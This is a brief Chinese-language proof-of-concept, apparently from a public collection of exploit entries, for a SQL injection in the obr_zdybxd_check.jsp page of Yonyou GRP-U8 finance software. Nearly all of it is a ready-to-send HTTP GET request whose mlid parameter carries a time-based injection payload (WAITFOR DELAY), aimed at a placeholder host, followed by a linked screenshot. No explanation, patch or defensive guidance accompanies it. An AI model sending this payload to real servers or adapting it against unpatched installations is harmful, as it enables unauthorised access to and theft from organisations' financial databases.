## 用友GRP-U8-obr_zdybxd_check存在sql注入漏洞

## poc
```
GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![fa7a791ea47812cbec3d99f5b37fd7bb](https://github.com/wy876/POC/assets/139549762/8bee3c88-ed03-4c91-9935-63e6dc34b5cd)
